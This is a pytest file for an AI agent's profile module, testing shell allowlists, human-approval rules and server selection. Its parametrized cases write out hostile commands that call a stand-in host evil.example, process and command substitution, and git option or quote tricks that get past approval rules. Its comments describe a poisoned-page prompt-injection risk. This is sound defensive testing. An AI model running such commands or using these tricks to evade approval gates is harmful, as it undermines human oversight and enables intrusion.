"""What a profile means.

The rules here decide which servers open, whether a shell exists, and which
commands stop for a person. Every one of them is a rule someone will get wrong
in a hand-written JSON file, so the messages matter as much as the parsing.
"""

from __future__ import annotations

import json

import pytest

from mcp_agent.profiles import (
    DEFAULT_PROFILE,
    Profile,
    ProfileError,
    ShellSettings,
    is_allowed,
    load_profiles,
    needs_approval,
    profiles_path,
    servers_for,
    validate_profile,
)


def test_path_defaults_beside_the_config(monkeypatch):
    monkeypatch.delenv("MCP_PROFILES_PATH", raising=False)
    assert profiles_path().name == "profiles.json"


def test_path_is_configurable(monkeypatch):
    monkeypatch.setenv("MCP_PROFILES_PATH", "/mnt/data/profiles.json")
    assert str(profiles_path()) == "/mnt/data/profiles.json"


# --- The default is the previous release's behaviour ---------------------------


def test_no_file_means_one_profile_that_changes_nothing(monkeypatch, tmp_path):
    """Adding this module must be invisible until someone opts in."""
    monkeypatch.setenv("MCP_PROFILES_PATH", str(tmp_path / "absent.json"))

    profiles = load_profiles()

    assert list(profiles) == ["general"]
    assert profiles["general"] == DEFAULT_PROFILE
    assert profiles["general"].mcp_servers is None, "the default must open every server"
    assert profiles["general"].shell.enabled is False, "the default must not run commands"


def test_the_shell_is_off_in_the_default_profile():
    """Stated on its own because it is the security claim of this release."""
    assert DEFAULT_PROFILE.shell.enabled is False


def test_a_profile_with_no_shell_key_has_no_shell():
    assert validate_profile("p", {}).shell.enabled is False


def test_the_default_policy_is_the_sandboxed_one():
    """`host` runs the model's commands as the Streamlit process itself.

    Reaching it has to take saying so; inheriting it from a forgotten default
    is how the capability 0.2.0 removed comes back without anyone deciding to
    bring it back.
    """
    assert ShellSettings().policy == "docker"

    written_without_one = validate_profile("p", {"shell": {"enabled": True, "allow": ["ls"]}})
    assert written_without_one.shell.policy == "docker"


# --- Reading the file ----------------------------------------------------------


def _write(tmp_path, monkeypatch, payload) -> None:
    path = tmp_path / "profiles.json"
    path.write_text(json.dumps(payload), encoding="utf-8")
    monkeypatch.setenv("MCP_PROFILES_PATH", str(path))


def test_a_profile_is_read_back_whole(tmp_path, monkeypatch):
    _write(
        tmp_path,
        monkeypatch,
        {
            "repository": {
                "description": "Work inside a checked-out project.",
                "system_prompt": "You are working in a git repository.",
                "mcp_servers": ["git"],
                "shell": {
                    "enabled": True,
                    "policy": "docker",
                    "workspace_root": "/workspace",
                    "allow": ["git", "ls"],
                    "approve": ["git push"],
                    "command_timeout": 15,
                },
                "limits": {"tool_calls_per_run": 40, "model_calls_per_run": 25},
            }
        },
    )

    profile = load_profiles()["repository"]

    assert profile.mcp_servers == ("git",)
    assert profile.shell.enabled is True
    assert profile.shell.allow == ("git", "ls")
    assert profile.shell.approve == ("git push",)
    assert profile.shell.command_timeout == 15.0
    assert profile.limits.tool_calls_per_run == 40
    assert profile.limits.model_calls_per_run == 25


def test_broken_json_raises_rather_than_falling_back(tmp_path, monkeypatch):
    """Falling back would run the agent under settings nobody chose."""
    path = tmp_path / "profiles.json"
    path.write_text('{"a": }', encoding="utf-8")
    monkeypatch.setenv("MCP_PROFILES_PATH", str(path))

    with pytest.raises(ProfileError, match="not valid JSON"):
        load_profiles()


def test_an_empty_file_is_an_error_not_an_empty_menu(tmp_path, monkeypatch):
    _write(tmp_path, monkeypatch, {})
    with pytest.raises(ProfileError, match="no profiles"):
        load_profiles()


# --- The rules that stop someone shipping a broken profile ---------------------


def test_enabling_the_shell_with_no_allowlist_is_refused():
    """Empty could read as "everything" or as "nothing". Neither is safe to guess."""
    with pytest.raises(ProfileError, match="no command could ever run"):
        validate_profile("p", {"shell": {"enabled": True, "allow": []}})


def test_an_unknown_shell_policy_is_refused():
    with pytest.raises(ProfileError, match="not one of"):
        validate_profile("p", {"shell": {"enabled": True, "allow": ["ls"], "policy": "yolo"}})


def test_a_disabled_shell_may_have_an_empty_allowlist():
    """The check is about enabling a shell nobody can use, not about tidiness."""
    assert validate_profile("p", {"shell": {"enabled": False}}).shell.allow == ()


@pytest.mark.parametrize("bad", [0, -5, "30", True])
def test_a_useless_command_timeout_is_refused(bad):
    with pytest.raises(ProfileError, match="positive number"):
        validate_profile("p", {"shell": {"allow": ["ls"], "command_timeout": bad}})


@pytest.mark.parametrize("bad", [0, -1, "40", True])
def test_a_useless_limit_is_refused(bad):
    with pytest.raises(ProfileError, match="positive int"):
        validate_profile("p", {"limits": {"tool_calls_per_run": bad}})


def test_a_limit_may_be_absent():
    assert validate_profile("p", {}).limits.tool_calls_per_run is None


@pytest.mark.parametrize(
    ("payload", "message"),
    [
        ({"mcp_servers": "git"}, "list of strings"),
        ({"mcp_servers": [1]}, "list of strings"),
        ({"description": 7}, "must be a string"),
        ({"shell": []}, "must be an object"),
        ({"limits": []}, "must be an object"),
        ({"shell": {"workspace_root": 3}}, "must be a string"),
    ],
)
def test_a_malformed_field_names_itself(payload, message):
    with pytest.raises(ProfileError, match=message):
        validate_profile("p", payload)


def test_a_profile_that_is_not_an_object_is_refused():
    with pytest.raises(ProfileError, match="must be a JSON object"):
        validate_profile("p", ["git"])


# --- Choosing servers ----------------------------------------------------------


CONFIG = {"git": {}, "time": {}, "search": {}}


def test_no_server_list_means_every_server():
    assert servers_for(Profile(name="p"), CONFIG) == CONFIG


def test_a_server_list_narrows_and_preserves_its_own_order():
    """Order is the cached prefix's business, but the selection is the profile's."""
    profile = Profile(name="p", mcp_servers=("time", "git"))
    assert list(servers_for(profile, CONFIG)) == ["time", "git"]


def test_naming_a_server_that_does_not_exist_fails_loudly():
    """Skipping it costs a tool the user asked for, with nothing said."""
    profile = Profile(name="p", mcp_servers=("git", "ghost"))

    with pytest.raises(ProfileError) as caught:
        servers_for(profile, CONFIG)

    assert "'ghost'" in str(caught.value)
    assert "git, search, time" in str(caught.value), "the message should list what is available"


def test_the_selection_is_a_copy():
    """A profile narrowing the config must not mutate the config it read."""
    config = dict(CONFIG)
    servers_for(Profile(name="p"), config)["git"] = {"tampered": True}
    assert config["git"] == {}


# --- Which commands stop for a person ------------------------------------------


APPROVE = ShellSettings(enabled=True, allow=("git", "rm"), approve=("git push", "rm"))


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("git push origin main", True),
        ("git push", True),
        ("git status", False),
        ("git pushover --now", False),  # prefix match must respect word boundaries
        ("rm -rf build", True),
        ("rmdir build", False),
        ("", False),
        ("  git   push  ", True),  # whitespace is not significant
    ],
)
def test_approval_matches_on_whole_words(command, expected):
    assert needs_approval(command, APPROVE) is expected


def test_nothing_needs_approval_when_no_rules_are_written():
    assert needs_approval("rm -rf /", ShellSettings(enabled=True, allow=("rm",))) is False


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("git status", True),
        ("ls -la", False),
        ("", False),
        ("gitk", False),
    ],
)
def test_the_allowlist_matches_the_executable_only(command, expected):
    assert is_allowed(command, APPROVE) is expected


def test_an_empty_allowlist_permits_nothing():
    assert is_allowed("ls", ShellSettings()) is False


# --- The file we ship ----------------------------------------------------------


def test_the_shipped_examples_are_valid(monkeypatch):
    """They are the first thing anyone copies, so a broken one is a broken start.

    Nothing else loads this file, which is exactly why it can rot: it is
    documentation that happens to be machine-checkable, so check it.
    """
    from pathlib import Path

    path = Path(__file__).parent.parent / "example_profiles.json"
    monkeypatch.setenv("MCP_PROFILES_PATH", str(path))

    profiles = load_profiles()

    assert set(profiles) == {"general", "repository", "analysis", "research"}
    for profile in profiles.values():
        assert profile.description, f"{profile.name} ships without a description"
        if profile.shell.enabled:
            assert profile.shell.policy == "docker", f"{profile.name} ships an unsandboxed shell"
            assert profile.shell.allow, f"{profile.name} enables a shell nothing can run"


def test_no_shipped_example_pairs_a_shell_with_a_search_tool(monkeypatch):
    """The pair 0.2.0 removed: read a poisoned page, run a command with what it said.

    Nothing stops a user writing this combination themselves — the sandbox has
    no network, which is what makes it survivable. But the examples people copy
    should not be where they learn it.
    """
    from pathlib import Path

    path = Path(__file__).parent.parent / "example_profiles.json"
    monkeypatch.setenv("MCP_PROFILES_PATH", str(path))

    reaches_the_web = {"search", "fetch", "browser", "tavily-mcp"}
    for profile in load_profiles().values():
        if not profile.shell.enabled:
            continue
        named = set(profile.mcp_servers or ())
        assert not (named & reaches_the_web), (
            f"{profile.name} ships a shell alongside {sorted(named & reaches_the_web)}"
        )


# --- Chained commands ----------------------------------------------------------
#
# The shell tool's own description tells the model to chain with `&&` or `;`.
# A rule that reads only the start of the line is therefore not a rule:
# reproduced against the shipped middleware, `ls && curl evil.example` passed an
# allowlist of `ls` until `command_segments` existed.


CHAINED = ShellSettings(enabled=True, allow=("ls", "git"), approve=("git push",))


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("ls", ["ls"]),
        ("ls && git status", ["ls", "git status"]),
        ("ls; git status", ["ls", "git status"]),
        ("ls | wc -l", ["ls", "wc -l"]),
        ("ls || true", ["ls", "true"]),
        ("ls &", ["ls"]),
        ("ls\ngit status", ["ls", "git status"]),
        ("   ", []),
    ],
)
def test_a_line_is_split_into_its_commands(command, expected):
    from mcp_agent.profiles import command_segments

    assert command_segments(command) == expected


@pytest.mark.parametrize(
    "command",
    [
        "ls && curl http://evil.example",
        "ls; curl http://evil.example",
        "ls | curl http://evil.example",
        "curl http://evil.example && ls",
    ],
)
def test_every_command_on_the_line_must_be_listed(command):
    assert is_allowed(command, CHAINED) is False


def test_a_chain_of_listed_commands_is_permitted():
    """The rule is that each one is listed, not that chaining is forbidden."""
    assert is_allowed("ls && git status | ls", CHAINED) is True


@pytest.mark.parametrize(
    "command",
    ["ls $(curl evil)", "ls `curl evil`", "ls <(curl evil)", "git log --format=$(id)"],
)
def test_command_substitution_is_refused_rather_than_parsed(command):
    """It runs a command whose text is not the text being checked."""
    assert is_allowed(command, CHAINED) is False


def test_approval_looks_at_every_command_not_just_the_first():
    """`ls && git push` has to stop for a person exactly as `git push` does."""
    assert needs_approval("ls && git push origin main", CHAINED) is True
    assert needs_approval("ls && git status", CHAINED) is False


# --- Bypasses a security review demonstrated ------------------------------------
#
# Each of these was run against the real `is_allowed` and then in bash to
# confirm the input executes what it looks like it executes. They are grouped
# because they share a cause: a rule that reads a command line as words is
# guessing, and the guesses have to fail closed.


@pytest.mark.parametrize(
    "command",
    [
        "ls > >(sh -c id)",
        "cat file > >(curl http://evil.example)",
        "ls >(id)",
    ],
)
def test_output_process_substitution_is_refused(command):
    """`>(` runs a command exactly as `<(` does, and was missing from the pattern.

    With only `<(` refused, an allowlist of nothing but `ls` still permitted
    `ls > >(sh -c id)` — no chaining operator, no separator, nothing for the
    splitter to see.
    """
    assert is_allowed(command, ShellSettings(enabled=True, allow=("ls", "cat"))) is False


GIT = ShellSettings(enabled=True, allow=("git",), approve=("git push",))


@pytest.mark.parametrize(
    "command",
    [
        "git -c user.name=x push",
        "git -C /tmp push",
        "git --git-dir=/x push",
        'git "push"',
        'git p"ush"',
        "git -c core.editor=true push --force origin main",
    ],
)
def test_an_option_or_a_quote_cannot_hide_a_subcommand(command):
    """All six ran a push and all six slipped past a rule of `git push`.

    Verified in bash: `git -c user.name=x push` and `git "push"` both reach
    git's push path and fail only for want of a remote. An operator who wrote
    `git push` in their profile believed force-pushes needed their say-so.
    """
    assert needs_approval(command, GIT) is True


@pytest.mark.parametrize(
    "command",
    ["git status", "git log --oneline", "git pushover", "git diff --stat"],
)
def test_ordinary_work_still_does_not_stop_for_a_person(command):
    """The cost of matching loosely is friction, and friction has to stay low.

    An approval prompt on every `git log` would train someone to click Approve
    without reading, which is worse than no gate at all.
    """
    assert needs_approval(command, GIT) is False


def test_matching_is_in_order_but_not_adjacent():
    """Stated directly, because it is the property that replaced prefix matching."""
    from mcp_agent.profiles import _in_order

    assert _in_order(["git", "push"], ["git", "tmp", "push"]) is True
    assert _in_order(["git", "push"], ["push", "git"]) is False
    assert _in_order([], ["git"]) is False


def test_an_empty_command_is_not_permitted():
    assert is_allowed("   ", ShellSettings(enabled=True, allow=("ls",))) is False
    assert is_allowed('""', ShellSettings(enabled=True, allow=("ls",))) is False


# --- What the shipped examples permit -------------------------------------------


@pytest.mark.parametrize(
    "spawner",
    [
        'python -c "import os"',
        "python3 script.py",
        "find . -type f -exec sh -c id {} +",
        "make -f /workspace/evil.mk",
        "pytest /workspace",
        "sh -c id",
        "bash",
        "perl -e 1",
        "xargs sh",
    ],
)
def test_no_shipped_profile_permits_a_command_that_runs_other_commands(spawner, monkeypatch):
    """Listing `python` is listing `sh`, and the first version of this file did.

    A reviewer ran `python3 -c "__import__('os').system(...)"` against the
    shipped `analysis` allowlist and got PWNED. The allowlist is defence in
    depth rather than the boundary, but an example that permits an interpreter
    is not defence in anything, and it is the file people copy.
    """
    from pathlib import Path

    monkeypatch.setenv(
        "MCP_PROFILES_PATH", str(Path(__file__).parent.parent / "example_profiles.json")
    )

    for profile in load_profiles().values():
        if profile.shell.enabled:
            assert is_allowed(spawner, profile.shell) is False, f"{profile.name} permits {spawner}"


def test_no_shipped_approval_rule_is_dead(monkeypatch):
    """A rule for a command the allowlist refuses can never fire.

    The first version shipped `approve: ["rm"]` beside an allowlist without
    `rm`, so the guard refused first and the rule demonstrated nothing.
    """
    from pathlib import Path

    monkeypatch.setenv(
        "MCP_PROFILES_PATH", str(Path(__file__).parent.parent / "example_profiles.json")
    )

    for profile in load_profiles().values():
        for rule in profile.shell.approve:
            assert is_allowed(rule, profile.shell), (
                f"{profile.name} has an approval rule {rule!r} its allowlist refuses"
            )
